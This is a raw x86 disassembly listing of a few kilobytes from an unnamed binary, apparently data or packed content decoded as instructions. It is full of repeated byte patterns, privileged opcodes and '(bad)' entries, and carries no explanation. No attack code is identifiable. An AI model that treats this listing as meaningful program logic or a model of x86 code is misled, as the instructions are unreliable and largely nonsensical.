  40f8af:	add    eax,0x5f643913
  40f8b4:	aam    0x24
  40f8b6:	sbb    BYTE PTR [ecx],al
  40f8b8:	test   DWORD PTR [edx-0x79],esp
  40f8bb:	and    al,0xc7
  40f8bd:	ins    BYTE PTR es:[edi],dx
  40f8be:	inc    eax
  40f8bf:	arpl   WORD PTR [eax],bx
  40f8c1:	pusha  
  40f8c2:	inc    edi
  40f8c3:	pop    ss
  40f8c4:	hlt    
  40f8c5:	cmp    al,0x14
  40f8c7:	add    DWORD PTR [ebx],0x404cab8c
  40f8cd:	inc    ebx
  40f8ce:	inc    eax
  40f8cf:	and    eax,0x406b
  40f8d4:	inc    ecx
  40f8d5:	inc    ebx
  40f8d6:	add    eax,0x41784062
  40f8db:	inc    eax
  40f8dc:	inc    eax
  40f8dd:	add    BYTE PTR [edi],cl
  40f8df:	bound  eax,QWORD PTR [ebx+0x0]
  40f8e2:	add    eax,0x25006240
  40f8e7:	inc    eax
  40f8e8:	add    eax,0x40254143
  40f8ed:	add    eax,0x63620000
  40f8f2:	add    BYTE PTR [edx+0x6b],ah
  40f8f5:	lds    ebp,FWORD PTR [esi-0x7f]
  40f8f8:	pop    es
  40f8f9:	mov    edx,0xd1ad9017
  40f8fe:	inc    eax
  40f8ff:	inc    ecx
  40f900:	pop    esi
  40f901:	inc    ebx
  40f902:	arpl   si,di
  40f904:	jae    0x40f8d4
  40f906:	push   cs
  40f907:	add    DWORD PTR [esi+0x484f057d],0x26bf4099
  40f911:	jb     0x40f89a
  40f913:	fmul   DWORD PTR es:[bx]
  40f917:	cmp    eax,0x70492a5e
  40f91c:	sub    eax,0x40014028
  40f921:	xor    BYTE PTR [eax+eax*4],0xc
  40f925:	pop    esp
  40f926:	or     DWORD PTR [ebx],eax
  40f928:	cs inc ebx
  40f92a:	add    BYTE PTR [eax],al
  40f92c:	add    BYTE PTR [ecx+0x40],al
  40f92f:	bound  esp,QWORD PTR [esi+0x0]
  40f932:	inc    eax
  40f933:	add    eax,0x5400000
  40f938:	inc    ecx
  40f939:	inc    eax
  40f93a:	inc    eax
  40f93b:	bound  esp,QWORD PTR ds:0x25050043
  40f941:	inc    ecx
  40f942:	inc    ebx
  40f943:	inc    eax
  40f944:	test   BYTE PTR [eax+0x0],al
  40f947:	bound  ebx,QWORD PTR [eax+0x62]
  40f94a:	inc    ecx
  40f94b:	inc    eax
  40f94c:	ret    0xc340
  40f94f:	gs inc ebx
  40f951:	inc    eax
  40f952:	add    DWORD PTR [ecx+0x4c],ebp
  40f955:	inc    edx
  40f956:	inc    esp
  40f957:	cwde   
  40f958:	inc    eax
  40f959:	adc    al,0x5b
  40f95b:	add    DWORD PTR [edx+0x53],esp
  40f95e:	dec    eax
  40f95f:	or     eax,0x1f844024
  40f964:	inc    ebx
  40f965:	and    al,ah
  40f967:	adc    BYTE PTR [edx+0x40],ah
  40f96a:	inc    ecx
  40f96b:	and    eax,0x40000500
  40f970:	inc    ebx
  40f971:	add    eax,0x40624041
  40f976:	inc    ebx
  40f977:	add    eax,0x43402541
  40f97c:	bound  eax,QWORD PTR [eax+0x43]
  40f97f:	int3   
  40f980:	inc    eax
  40f981:	bound  eax,QWORD PTR [eax]
  40f983:	inc    ecx
  40f984:	inc    eax
  40f985:	inc    eax
  40f986:	add    eax,0x36cc905
  40f98b:	add    edi,DWORD PTR cs:[esp+edi*1+0x1c]
  40f990:	jmp    0x40f968
  40f992:	inc    eax
  40f993:	iret   
  40f994:	pusha  
  40f995:	je     0x40f917
  40f997:	dec    edi
  40f998:	mov    ebx,0x82031543
  40f99d:	(bad)  
  40f99e:	vpcmpgtb ymm0,ymm4,ymm5
  40f9a2:	inc    eax
  40f9a3:	fbld   TBYTE PTR [edx]
  40f9a5:	hlt    
  40f9a6:	xchg   edx,eax
  40f9a7:	pop    edi
  40f9a8:	add    BYTE PTR [ecx+0x65600112],ch
  40f9ae:	mov    edi,0x40ba9c41
  40f9b3:	bound  eax,QWORD PTR gs:[eax+0x25]
  40f9b7:	add    BYTE PTR [esi+0x40],ah
  40f9ba:	add    eax,0x40404143
  40f9bf:	inc    ebx
  40f9c0:	add    BYTE PTR [eax],al
  40f9c2:	add    BYTE PTR [edx-0x34],ah
  40f9c5:	inc    eax
  40f9c6:	add    eax,0x40004041
  40f9cb:	inc    ecx
  40f9cc:	int3   
  40f9cd:	add    BYTE PTR [ebx-0x7c],al
  40f9d0:	add    eax,0x5406240
  40f9d5:	bound  eax,QWORD PTR [eax]
  40f9d7:	pop    eax
  40f9d8:	sbb    al,0xbd
  40f9da:	add    eax,0x2703141f
  40f9df:	lods   al,BYTE PTR ds:[esi]
  40f9e0:	adc    BYTE PTR [edi-0x79],dh
  40f9e3:	lods   al,BYTE PTR ds:[esi]
  40f9e4:	inc    eax
  40f9e5:	cmp    BYTE PTR [edx-0x3d],bh
  40f9e8:	retf   
  40f9e9:	add    eax,0x81132840
  40f9ee:	pop    ecx
  40f9ef:	cdq    
  40f9f0:	mov    edi,0x41586240
  40f9f5:	add    eax,0x40404340
  40f9fa:	inc    ebx
  40f9fb:	inc    eax
  40f9fc:	test   BYTE PTR [eax],al
  40f9fe:	add    eax,0x40624041
  40fa03:	inc    eax
  40fa04:	add    BYTE PTR [edx+0x5],ah
  40fa07:	inc    ebx
  40fa08:	add    BYTE PTR [eax+0x78],al
  40fa0b:	inc    ecx
  40fa0c:	add    BYTE PTR [eax+0x41],bl
  40fa0f:	bound  eax,QWORD PTR [ecx+0x42]
  40fa12:	pop    eax
  40fa13:	inc    eax
  40fa14:	scas   eax,DWORD PTR es:[edi]
  40fa15:	push   es
  40fa16:	(bad)  
  40fa17:	mov    edi,0xe43aabd
  40fa1c:	or     ch,BYTE PTR [ecx+ebx*2]
  40fa1f:	jne    0x40fa8d
  40fa21:	sbb    al,0x40
  40fa23:	inc    eax
  40fa24:	add    edx,DWORD PTR [ecx]
  40fa26:	inc    eax
  40fa27:	test   BYTE PTR [eax],al
  40fa29:	int3   
  40fa2a:	bound  eax,QWORD PTR ds:0xcc840f41
  40fa30:	inc    ebx
  40fa31:	add    BYTE PTR [eax+0x0],al
  40fa34:	inc    eax
  40fa35:	inc    eax
  40fa36:	inc    eax
  40fa37:	int3   
  40fa38:	add    BYTE PTR ds:0x62404341,al
  40fa3e:	pop    eax
  40fa3f:	add    BYTE PTR [ebx+0x40],al
  40fa42:	bound  ecx,QWORD PTR [edi]
  40fa44:	inc    eax
  40fa45:	nop
  40fa46:	mov    DWORD PTR [ebx],ebx
  40fa48:	bound  esp,QWORD PTR [ecx+ecx*1]
  40fa4b:	inc    ebx
  40fa4c:	sub    dh,0xa8
  40fa4f:	test   al,0x6b
  40fa51:	ins    BYTE PTR es:[edi],dx
  40fa52:	inc    eax
  40fa53:	add    BYTE PTR [ebx],dh
  40fa55:	xchg   esp,eax
  40fa56:	dec    edx
  40fa57:	adc    dh,al
  40fa59:	lock add BYTE PTR [eax],al
  40fa5c:	inc    eax
  40fa5d:	inc    eax
  40fa5e:	cmovno eax,DWORD PTR ds:0x40056243
  40fa65:	int3   
  40fa66:	add    ah,cl
  40fa68:	inc    eax
  40fa69:	inc    eax
  40fa6a:	bound  eax,QWORD PTR [ecx+0x0]
  40fa6d:	add    BYTE PTR [edi],cl
  40fa6f:	inc    ebx
  40fa70:	inc    eax
  40fa71:	inc    eax
  40fa72:	add    BYTE PTR [ecx+0x43],al
  40fa75:	add    eax,0x40256240
  40fa7a:	bound  eax,QWORD PTR [eax]
  40fa7c:	pop    ds
  40fa7d:	sub    DWORD PTR [edi-0x7e],edi
  40fa80:	jne    0x40fad7
  40fa82:	nop
  40fa83:	dec    ebx
  40fa84:	inc    eax
  40fa85:	int    0x85
  40fa87:	cmp    al,0xe4
  40fa89:	inc    ecx
  40fa8a:	sub    al,ch
  40fa8c:	adc    al,0x2
  40fa8e:	sbb    ah,BYTE PTR [edx+0x62]
  40fa91:	dec    edi
  40fa92:	fisttp QWORD PTR [esi+0x40]
  40fa95:	lds    eax,FWORD PTR cs:[ebp+0x5a]
  40fa99:	mov    esp,0x3410cbcd
  40fa9e:	pop    edx
  40fa9f:	cmp    BYTE PTR [edx],ch
  40faa1:	inc    edi
  40faa2:	inc    edi
  40faa3:	jne    0x40fae5
  40faa5:	add    ebx,0x7
  40faa8:	adc    al,bh
  40faaa:	sub    DWORD PTR [ecx],ebx
  40faac:	sbb    DWORD PTR [ebp-0x55],edi
  40faaf:	mov    bh,0xbc
  40fab1:	add    eax,0x4140cc00
  40fab6:	inc    eax
  40fab7:	inc    ebx
  40fab8:	bound  esp,QWORD PTR ds:0x41400043
  40fabe:	add    BYTE PTR [eax],al
  40fac0:	add    eax,0x43624062
  40fac5:	inc    ecx
  40fac6:	inc    eax
  40fac7:	inc    eax
  40fac8:	inc    eax
  40fac9:	add    eax,0x40624340
  40face:	add    eax,0x40664140
  40fad3:	(bad)  [eax+ebp*1+0x40]
  40fad7:	test   ecx,eax
  40fad9:	test   al,0x5
  40fadb:	dec    esp
  40fadc:	inc    edi
  40fadd:	push   esp
  40fade:	adc    al,ch
  40fae0:	out    dx,eax
  40fae1:	adc    ch,cl
  40fae3:	jge    0x40fb19
  40fae5:	add    DWORD PTR [eax+0x9],eax
  40fae8:	pop    edx
  40fae9:	inc    ecx
  40faea:	inc    esp
  40faeb:	push   0x97034414
  40faf0:	ret    0x2a43
  40faf3:	str    WORD PTR [esi+0x40]
  40faf7:	arpl   WORD PTR [ebx],si
  40faf9:	push   eax
  40fafa:	inc    eax
  40fafb:	(bad)  
  40fafd:	call   0x67920607
  40fb02:	sub    al,BYTE PTR [esi+0x2e]
  40fb05:	inc    ebx
  40fb06:	inc    eax
  40fb07:	imul   eax,DWORD PTR [ebx+0x0],0x10784005
  40fb0e:	inc    ecx
  40fb0f:	bound  eax,QWORD PTR [eax+0x40]
  40fb12:	sldt   WORD PTR [eax-0x34]
  40fb16:	js     0x40fb7a
  40fb18:	add    eax,0x40664143
  40fb1d:	inc    ebx
  40fb1e:	add    BYTE PTR [ecx+0x5],al
  40fb21:	js     0x40fb63
  40fb23:	bound  eax,QWORD PTR [eax+0x0]
  40fb26:	inc    eax
  40fb27:	rol    DWORD PTR [ebx+0x47],0x44
  40fb2b:	sub    al,0x84
  40fb2d:	add    al,0x9
  40fb2f:	sbb    ebp,DWORD PTR [ecx+0x76]
  40fb32:	outs   dx,BYTE PTR ds:[esi]
  40fb33:	outs   dx,BYTE PTR ds:[esi]
  40fb34:	mov    al,BYTE PTR [eax+0x67]
  40fb37:	sar    ecx,0x64
  40fb3a:	mov    eax,0x1405630
  40fb3f:	xchg   BYTE PTR [ebx+0x65],ah
  40fb42:	xor    ah,BYTE PTR [edx-0x27]
  40fb45:	inc    ecx
  40fb46:	inc    ebx
  40fb47:	inc    eax
  40fb48:	inc    eax
  40fb49:	add    eax,0x434162
  40fb4e:	inc    eax
  40fb4f:	add    BYTE PTR [edx+0x5],ah
  40fb52:	inc    eax
  40fb53:	adc    BYTE PTR [edx+0x40],ah
  40fb56:	inc    ebx
  40fb57:	inc    ecx
  40fb58:	add    eax,0x4340
  40fb5d:	add    eax,0x404162
  40fb62:	add    BYTE PTR [eax+0x43],al
  40fb65:	inc    eax
  40fb66:	add    eax,0x44cd2a40
  40fb6b:	add    ebx,DWORD PTR [ecx+0x38]
  40fb6e:	xchg   edx,eax
  40fb6f:	and    al,0x5
  40fb71:	aas    
  40fb72:	inc    edi
  40fb73:	mov    esp,0x4025a962
  40fb78:	dec    ecx
  40fb79:	rol    cl,0x66
  40fb7c:	xchg   BYTE PTR [ecx+eax*1+0x3fb60140],bh
  40fb83:	jge    0x40fb39
  40fb85:	popa   
  40fb86:	jne    0x40fbc8
  40fb88:	push   0x40
  40fb8a:	test   al,0x7c
  40fb8c:	and    DWORD PTR [esi],ecx
  40fb8e:	sub    BYTE PTR [ebx],ah
  40fb90:	add    edi,esp
  40fb92:	arpl   WORD PTR cs:[eax+0x0],ax
  40fb96:	add    BYTE PTR [ecx+0x43],al
  40fb99:	add    eax,0x41784062
  40fb9e:	inc    eax
  40fb9f:	inc    eax
  40fba0:	add    BYTE PTR [edi],cl
  40fba2:	bound  eax,QWORD PTR [ebx+0x0]
  40fba5:	add    eax,0x25006240
  40fbaa:	inc    eax
  40fbab:	add    eax,0x40254143
  40fbb0:	add    eax,0xda620000
  40fbb5:	bound  edx,QWORD PTR [eax+0x40]
  40fbb8:	dec    ecx
  40fbb9:	or     al,0x3a
  40fbbb:	push   cs
  40fbbc:	xchg   esi,eax
  40fbbd:	add    eax,DWORD PTR [edx]
  40fbbf:	inc    eax
  40fbc0:	xor    DWORD PTR [ebp+0x63],0x50
  40fbc4:	stos   DWORD PTR es:[edi],eax
  40fbc5:	cmp    al,0xc9
  40fbc7:	inc    eax
  40fbc8:	dec    eax
  40fbc9:	ret    
  40fbca:	cmc    
  40fbcb:	addr16 inc ebx
  40fbcd:	add    BYTE PTR [eax],al
  40fbcf:	add    BYTE PTR [ecx+0x40],al
  40fbd2:	bound  esp,QWORD PTR [esi+0x0]
  40fbd5:	inc    eax
  40fbd6:	add    eax,0x5400000
  40fbdb:	inc    ecx
  40fbdc:	inc    eax
  40fbdd:	inc    eax
  40fbde:	bound  esp,QWORD PTR ds:0x25050043
  40fbe4:	inc    ecx
  40fbe5:	inc    ebx
  40fbe6:	inc    eax
  40fbe7:	test   BYTE PTR [eax+0x0],al
  40fbea:	bound  ebx,QWORD PTR [eax+0x62]
  40fbed:	inc    ecx
  40fbee:	inc    eax
  40fbef:	inc    edx
  40fbf0:	std    
  40fbf1:	inc    ebp
  40fbf2:	and    al,BYTE PTR [eax-0x377f87b0]
  40fbf8:	xchg   esp,eax
  40fbf9:	inc    ebx
  40fbfa:	inc    eax
  40fbfb:	mov    edi,0x417362c3
  40fc00:	jo     0x40fb92
  40fc02:	inc    eax
  40fc03:	and    al,0x77
  40fc05:	retf   
  40fc06:	inc    edx
  40fc07:	sbb    eax,0x24407003
  40fc0c:	rcl    DWORD PTR [eax],0x62
  40fc0f:	inc    eax
  40fc10:	inc    ecx
  40fc11:	and    eax,0x40000500
  40fc16:	inc    ebx
  40fc17:	add    eax,0x40624041
  40fc1c:	inc    ebx
  40fc1d:	add    eax,0x43402541
  40fc22:	bound  eax,QWORD PTR [eax+0x43]
  40fc25:	int3   
  40fc26:	inc    eax
  40fc27:	bound  eax,QWORD PTR [eax]
  40fc29:	inc    ecx
  40fc2a:	inc    eax
  40fc2b:	inc    eax
  40fc2c:	add    eax,0xc415805
  40fc31:	frstor [eax]
  40fc33:	and    DWORD PTR [ecx],eax
  40fc35:	test   DWORD PTR [ebp+0x3b],esp
  40fc38:	push   edx
  40fc39:	fs mov ah,0x40
  40fc3c:	arpl   bx,ax
  40fc3e:	inc    esp
  40fc3f:	inc    edi
  40fc40:	adc    eax,0x140a494
  40fc45:	outs   dx,BYTE PTR ds:[esi]
  40fc46:	and    al,0x62
  40fc48:	inc    eax
  40fc49:	and    eax,0x5406600
  40fc4e:	inc    ebx
  40fc4f:	inc    ecx
  40fc50:	inc    eax
  40fc51:	inc    eax
  40fc52:	inc    ebx
  40fc53:	add    BYTE PTR [eax],al
  40fc55:	add    BYTE PTR [edx-0x34],ah
  40fc58:	inc    eax
  40fc59:	add    eax,0x40004041
  40fc5e:	inc    ecx
  40fc5f:	int3   
  40fc60:	add    BYTE PTR [ebx-0x7c],al
  40fc63:	add    eax,0x5406240
  40fc68:	(bad)  
  40fc69:	clc    
  40fc6a:	retf   
  40fc6b:	inc    edx
  40fc6c:	test   al,0x40
  40fc6e:	inc    ebx
  40fc6f:	ror    al,0x47
  40fc72:	jo     0x40fcc4
  40fc74:	adc    DWORD PTR [eax+0x1],edx
  40fc77:	cs jbe 0x40fcaf
  40fc7a:	or     dl,0xbc
  40fc7d:	inc    eax
  40fc7e:	addr16 pop eax
  40fc80:	test   al,0x43
  40fc82:	ret    
  40fc83:	loopne 0x40fc92
  40fc85:	inc    eax
  40fc86:	add    ecx,0x45484210
  40fc8c:	retf   
  40fc8d:	inc    eax
  40fc8e:	inc    esp
  40fc8f:	cmp    eax,0x3c4348bc
  40fc94:	mov    ecx,0x62400344
  40fc99:	pop    eax
  40fc9a:	inc    ecx
  40fc9b:	add    eax,0x40404340
  40fca0:	inc    ebx
  40fca1:	inc    eax
  40fca2:	test   BYTE PTR [eax],al
  40fca4:	add    eax,0x40624041
  40fca9:	inc    eax
  40fcaa:	add    BYTE PTR [edx+0x5],ah
  40fcad:	inc    ebx
  40fcae:	add    BYTE PTR [eax+0x78],al
  40fcb1:	inc    ecx
  40fcb2:	add    BYTE PTR [eax+0x41],bl
  40fcb5:	bound  ecx,QWORD PTR [ebp+0x42]
  40fcb8:	les    eax,FWORD PTR [ebp-0x2e]
  40fcbb:	cmp    al,BYTE PTR [eax+0x20]
  40fcbe:	ret    0x5196
  40fcc1:	cmp    dl,cl
  40fcc3:	gs inc eax
  40fcc5:	add    al,0x35
  40fcc7:	dec    eax
  40fcc8:	inc    ecx
  40fcc9:	mov    ebx,0x28409481
  40fcce:	inc    eax
  40fccf:	test   BYTE PTR [eax],al
  40fcd1:	int3   
  40fcd2:	bound  eax,QWORD PTR ds:0xcc840f41
  40fcd8:	inc    ebx
  40fcd9:	add    BYTE PTR [eax+0x0],al
  40fcdc:	inc    eax
  40fcdd:	inc    eax
  40fcde:	inc    eax
  40fcdf:	int3   
  40fce0:	add    BYTE PTR ds:0x62404341,al
  40fce6:	pop    eax
  40fce7:	add    BYTE PTR [ebx+0x40],al
  40fcea:	bound  ecx,QWORD PTR [edi]
  40fcec:	inc    eax
  40fced:	shl    BYTE PTR [ebx+0x39],1
  40fcf0:	pushf  
  40fcf1:	sub    ch,BYTE PTR [eax]
  40fcf3:	inc    ebx
  40fcf4:	ds ror ebx,0x46
  40fcf8:	push   eax
  40fcf9:	imul   ecx,DWORD PTR [eax+eax*2+0x4d],0x22
  40fcfe:	cdq    
  40fcff:	clc    
  40fd00:	(bad)  
  40fd01:	test   al,0x2
  40fd03:	inc    eax
  40fd04:	add    al,bl
  40fd06:	adc    eax,0xc9165949
  40fd0b:	inc    eax
  40fd0c:	es dec ecx
  40fd0e:	bound  esi,QWORD PTR ds:0x42b8cb4c
  40fd14:	inc    ecx
  40fd15:	les    ecx,FWORD PTR [edx]
  40fd17:	inc    edx
  40fd18:	jge    0x40fce5
  40fd1a:	add    eax,0x8140
  40fd1f:	inc    eax
  40fd20:	inc    eax
  40fd21:	cmovno eax,DWORD PTR ds:0x40056243
  40fd28:	int3   
  40fd29:	add    ah,cl
  40fd2b:	inc    eax
  40fd2c:	inc    eax
  40fd2d:	bound  eax,QWORD PTR [ecx+0x0]
  40fd30:	add    BYTE PTR [edi],cl
  40fd32:	inc    ebx
  40fd33:	inc    eax
  40fd34:	inc    eax
  40fd35:	add    BYTE PTR [ecx+0x43],al
  40fd38:	add    eax,0x40256240
  40fd3d:	bound  eax,QWORD PTR [eax]
  40fd3f:	sub    eax,0x27774228
  40fd44:	retf   
  40fd45:	inc    eax
  40fd46:	pop    ebx
  40fd47:	inc    ebp
  40fd48:	push   ebx
  40fd49:	dec    eax
  40fd4a:	jl     0x40fd6d
  40fd4c:	dec    edi
  40fd4d:	inc    eax
  40fd4e:	add    cl,al
  40fd50:	push   eax
  40fd51:	les    esi,FWORD PTR [esp+eiz*2]
  40fd54:	inc    edi
  40fd55:	inc    ecx
  40fd56:	xor    esi,ecx
  40fd58:	xor    al,0x60
  40fd5a:	inc    ebx
  40fd5b:	cmp    DWORD PTR ds:0x4140cc00,eax
  40fd61:	inc    eax
  40fd62:	inc    ebx
  40fd63:	bound  esp,QWORD PTR ds:0x41400043
  40fd69:	add    BYTE PTR [eax],al
  40fd6b:	add    eax,0x43624062
  40fd70:	inc    ecx
  40fd71:	inc    eax
  40fd72:	inc    eax
  40fd73:	inc    eax
  40fd74:	add    eax,0x40624340
  40fd79:	add    eax,0x40664140
  40fd7e:	sub    al,0x40
  40fd80:	xchg   ebx,eax
  40fd82:	inc    ecx
  40fd83:	inc    ecx
  40fd84:	mov    edx,0xc34055a8
  40fd89:	sti    
  40fd8a:	bound  edi,QWORD PTR [ecx]
  40fd8c:	push   0x11
  40fd8e:	retf   
  40fd8f:	inc    eax
  40fd90:	fmul   QWORD PTR [ebp+esi*2+0x45]
  40fd94:	mov    cl,BYTE PTR [eax+0x48]
  40fd97:	inc    ecx
  40fd98:	ret    0x31c0
  40fd9b:	inc    esi
  40fd9c:	cmp    eax,DWORD PTR [ecx+0x40]
  40fd9f:	inc    eax
  40fda0:	adc    al,0x60
  40fda2:	lods   eax,DWORD PTR ds:[esi]
  40fda3:	mov    DWORD PTR [eax-0x9bfd8cc],ebp
  40fda9:	push   esi
  40fdaa:	bound  ebp,QWORD PTR [ebx+0x12]
  40fdad:	lock ins BYTE PTR es:[edi],dx
  40fdaf:	inc    eax
  40fdb0:	mov    DWORD PTR [ebx+0x0],0x10784005
  40fdb7:	inc    ecx
  40fdb8:	bound  eax,QWORD PTR [eax+0x40]
  40fdbb:	sldt   WORD PTR [eax-0x34]
  40fdbf:	js     0x40fe23
  40fdc1:	add    eax,0x40664143
  40fdc6:	inc    ebx
  40fdc7:	add    BYTE PTR [ecx+0x5],al
  40fdca:	js     0x40fe0c
  40fdcc:	bound  eax,QWORD PTR [eax+0x0]
  40fdcf:	inc    eax
  40fdd0:	rcl    BYTE PTR [edx-0x55],0x4b
  40fdd4:	bound  ecx,QWORD PTR [edx+0x43]
  40fdd7:	les    ebp,FWORD PTR [ecx]
  40fdd9:	and    al,0x6f
  40fddb:	inc    edx
  40fddc:	jb     0x40fe24
  40fdde:	inc    eax
  40fddf:	and    DWORD PTR [edx-0x3b],eax
  40fde2:	inc    edx
  40fde3:	adc    DWORD PTR [eax-0x37],ebx
  40fde6:	inc    eax
  40fde7:	ins    DWORD PTR es:[edi],dx
  40fde8:	rcr    al,0x33
  40fdeb:	mov    esp,0xc240f662
  40fdf0:	sbb    ch,BYTE PTR [eax+0xc524544]
  40fdf6:	inc    eax
  40fdf7:	outs   dx,DWORD PTR ss:[esi]
  40fdf9:	inc    edx
  40fdfa:	inc    esi
  40fdfb:	clc    
  40fdfc:	xor    al,0x53
  40fdfe:	xor    BYTE PTR [edi-0x39],al
  40fe01:	sub    cl,BYTE PTR [ecx+0x4043415d]
  40fe07:	inc    eax
  40fe08:	add    eax,0x434162
  40fe0d:	inc    eax
  40fe0e:	add    BYTE PTR [edx+0x5],ah
  40fe11:	inc    eax
  40fe12:	adc    BYTE PTR [edx+0x40],ah
  40fe15:	inc    ebx
  40fe16:	inc    ecx
  40fe17:	add    eax,0x4340
  40fe1c:	add    eax,0x404162
  40fe21:	add    BYTE PTR [eax+0x43],al
  40fe24:	inc    eax
  40fe25:	add    eax,0xc0eaae40
  40fe2a:	push   ebp
  40fe2b:	inc    edx
  40fe2c:	jp     0x40fe7a
  40fe2e:	mov    al,0x28
  40fe30:	je     0x40fe64
  40fe32:	shr    DWORD PTR [ecx],0x35
  40fe35:	jge    0x40fe74
  40fe37:	inc    esp
  40fe38:	std    
  40fe39:	(bad)  
  40fe3a:	jmp    0x40fe20
  40fe3c:	inc    esi
  40fe3d:	jo     0x40fe02
  40fe3f:	add    edi,esi
  40fe41:	inc    eax
  40fe42:	add    BYTE PTR [eax],al
  40fe44:	inc    ecx
  40fe45:	inc    ebx
  40fe46:	add    eax,0x41784062
  40fe4b:	inc    eax
  40fe4c:	inc    eax
  40fe4d:	add    BYTE PTR [edi],cl
  40fe4f:	bound  eax,QWORD PTR [ebx+0x0]
  40fe52:	add    eax,0x25006240
  40fe57:	inc    eax
  40fe58:	add    eax,0x40254143
  40fe5d:	add    eax,0xc2620000
  40fe62:	outs   dx,BYTE PTR ds:[esi]
  40fe63:	bound  edi,QWORD PTR [eax-0x35bb6d4d]
  40fe69:	cmp    edx,ecx
  40fe6b:	inc    eax
  40fe6c:	cmp    eax,0x8040bf30
  40fe71:	jmp    0x2050:0x68c34232
  40fe78:	dec    ecx
  40fe79:	adc    bl,BYTE PTR [ecx+0x40]
  40fe7c:	add    BYTE PTR [eax-0x3e8e94ba],bh
  40fe82:	rol    BYTE PTR [esi-0x55],0x5
  40fe86:	inc    ecx
  40fe87:	fs in  al,dx
  40fe89:	push   esi
  40fe8a:	inc    ebx
  40fe8b:	add    BYTE PTR [eax],al
  40fe8d:	add    BYTE PTR [ecx+0x40],al
  40fe90:	bound  esp,QWORD PTR [esi+0x0]
  40fe93:	inc    eax
  40fe94:	add    eax,0x5400000
  40fe99:	inc    ecx
  40fe9a:	inc    eax
  40fe9b:	inc    eax
  40fe9c:	bound  esp,QWORD PTR ds:0x25050043
  40fea2:	inc    ecx
  40fea3:	inc    ebx
  40fea4:	inc    eax
  40fea5:	test   BYTE PTR [eax+0x0],al
  40fea8:	bound  ebx,QWORD PTR [eax+0x62]
  40feab:	inc    ecx
  40feac:	inc    eax
  40fead:	aaa    
  40feae:	inc    ecx
  40feaf:	add    al,0xcb
  40feb1:	xor    BYTE PTR [ebx+0x5],al
  40feb4:	rcr    BYTE PTR [ecx+0x4a],0xab
  40feb8:	test   BYTE PTR [edx-0x3ad6b61f],al
  40febe:	adc    BYTE PTR [eax-0x55],al
  40fec1:	test   al,0x76
  40fec3:	(bad)  
  40fec4:	push   ebx
  40fec5:	add    eax,0x1101406a
  40feca:	cmp    DWORD PTR [edx],eax
  40fecc:	rol    cl,0x2f
  40fecf:	inc    eax
  40fed0:	je     0x40fe86
  40fed2:	mov    dl,0xbe
  40fed4:	and    ah,BYTE PTR [eax+eiz*1+0x43]
  40fed8:	inc    esp
  40fed9:	inc    ecx
  40feda:	sub    BYTE PTR [ecx+0x40],al
  40fedd:	ret    
  40fede:	adc    BYTE PTR [edx+0x40],ah
  40fee1:	inc    ecx
  40fee2:	and    eax,0x40000500
  40fee7:	inc    ebx
  40fee8:	add    eax,0x40624041
  40feed:	inc    ebx
  40feee:	add    eax,0x43402541
  40fef3:	bound  eax,QWORD PTR [eax+0x43]
  40fef6:	int3   
  40fef7:	inc    eax
  40fef8:	bound  eax,QWORD PTR [eax]
  40fefa:	inc    ecx
  40fefb:	inc    eax
  40fefc:	inc    eax
  40fefd:	add    eax,0xd9f82105
  40ff02:	add    BYTE PTR [ecx+0x40],al
  40ff05:	mov    edx,0x1c47f054
  40ff0a:	aam    0xc9
  40ff0c:	inc    eax
  40ff0d:	pop    eax
  40ff0e:	rcl    ah,0x35
  40ff11:	push   edx
  40ff12:	inc    esp
  40ff13:	inc    ebx
  40ff14:	inc    eax
  40ff15:	shr    edi,0x8a
  40ff18:	inc    edx
  40ff19:	inc    edx
  40ff1a:	sub    al,0x44
  40ff1c:	dec    esp
  40ff1d:	xchg   ecx,eax
  40ff1e:	and    al,0xa8
  40ff20:	mov    esp,0x402c8f94
  40ff25:	pusha  
  40ff26:	fcom   DWORD PTR [edx]
  40ff28:	cmp    eax,0x404d440c
  40ff2d:	push   ebx
  40ff2e:	ror    DWORD PTR [eax-0x3d],0x44
  40ff32:	sub    eax,0x254062cb
  40ff37:	add    BYTE PTR [esi+0x40],ah
  40ff3a:	add    eax,0x40404143
  40ff3f:	inc    ebx
  40ff40:	add    BYTE PTR [eax],al
  40ff42:	add    BYTE PTR [edx-0x34],ah
  40ff45:	inc    eax
  40ff46:	add    eax,0x40004041
  40ff4b:	inc    ecx
  40ff4c:	int3   
  40ff4d:	add    BYTE PTR [ebx-0x7c],al
  40ff50:	add    eax,0x5406240
  40ff55:	bound  eax,QWORD PTR [eax+0x48]
  40ff58:	dec    ebp
  40ff59:	inc    ecx
  40ff5a:	dec    ebp
  40ff5b:	push   ecx
  40ff5c:	retf   
  40ff5d:	dec    eax
  40ff5e:	pop    eax
  40ff5f:	rol    bl,0xcf
  40ff62:	stos   DWORD PTR es:[edi],eax
  40ff63:	imul   eax,edx,0x117840ee
  40ff69:	and    al,0x13
  40ff6b:	xchg   BYTE PTR [ecx],al
  40ff6d:	jge    0x40ffaf
  40ff6f:	inc    eax
  40ff70:	shl    BYTE PTR [edx-0x55],0xc3
  40ff74:	arpl   WORD PTR [eax-0x47da8bc0],bp
  40ff7a:	inc    edi
  40ff7b:	mov    al,0x5
  40ff7d:	adc    al,BYTE PTR [eax+0x62]
  40ff80:	pop    eax
  40ff81:	inc    ecx
  40ff82:	add    eax,0x40404340
  40ff87:	inc    ebx
  40ff88:	inc    eax
  40ff89:	test   BYTE PTR [eax],al
  40ff8b:	add    eax,0x40624041
  40ff90:	inc    eax
  40ff91:	add    BYTE PTR [edx+0x5],ah
  40ff94:	inc    ebx
  40ff95:	add    BYTE PTR [eax+0x78],al
  40ff98:	inc    ecx
  40ff99:	add    BYTE PTR [eax+0x41],bl
  40ff9c:	bound  edx,QWORD PTR [eax+eax*2+0x3e]
  40ffa0:	call   0xbcc8cae5
  40ffa5:	inc    eax
  40ffa6:	jo     0x40ff69
  40ffa8:	add    cl,BYTE PTR [esi+0x40154741]
  40ffae:	pusha  
  40ffaf:	fs cwde 
  40ffb1:	fadd   QWORD PTR [ebp+0x5]
  40ffb4:	retf   
  40ffb5:	inc    eax
  40ffb6:	inc    eax
  40ffb7:	sar    BYTE PTR [esi+0x49],0xe0
  40ffbb:	call   FWORD PTR [eax+0x50]
  40ffbe:	jb     0x410020
  40ffc0:	shl    BYTE PTR ds:0x404c0d22,1
  40ffc6:	inc    eax
  40ffc7:	ss ja  0x41000b
  40ffca:	pusha  
  40ffcb:	leave  
  40ffcc:	dec    ebp
  40ffcd:	inc    eax
  40ffce:	ins    DWORD PTR es:[edi],dx
  40ffcf:	jge    0x40ff9d
  40ffd1:	mov    esp,0x4063a4d1
  40ffd6:	inc    eax
  40ffd7:	(bad)  
